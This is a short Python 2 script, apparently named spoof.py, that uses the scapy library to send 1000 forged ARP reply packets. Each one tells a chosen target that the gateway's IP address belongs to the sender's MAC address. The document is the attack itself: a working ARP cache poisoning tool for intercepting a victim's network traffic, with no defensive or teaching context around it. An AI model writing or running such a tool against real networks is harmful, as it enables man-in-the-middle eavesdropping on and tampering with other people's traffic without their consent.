import sys
from scapy.all import (
    get_if_hwaddr,
    getmacbyip,
    ARP,
    Ether,
    sendp
)

try:
    my_mac = sys.argv[1]
    interface = sys.argv[2]
    my_ip = sys.argv[3]
    target_ip = sys.argv[4]
    target_mac = sys.argv[5]
except:
    print "Usage: sudo python spoof.py [MY_MAC] [IFACE] [GATEWAY_IP] [TARGET_IP] [TARGET_MAC]"
    exit()

ether = Ether()
ether.src = my_mac # Default: network card mac

arp = ARP()
arp.psrc = my_ip
arp.hwsrc = my_mac

arp = arp
arp.pdst = target_ip # Default: 0.0.0.0
arp.hwdst = target_mac # Default: 00:00:00:00:00:00

ether = ether
ether.src = my_mac
ether.dst = target_mac # Default: ff:ff:ff:ff:ff:f

def craftRequestPkt():
    packet = ether/arp
    sendp(x=packet, inter=1, count=1000)

def craftReplyPkt():
    arp.op = 2
    packet = ether/arp
    sendp(x=packet, inter=1, count=1000)


if __name__ == '__main__':
    craftReplyPkt()
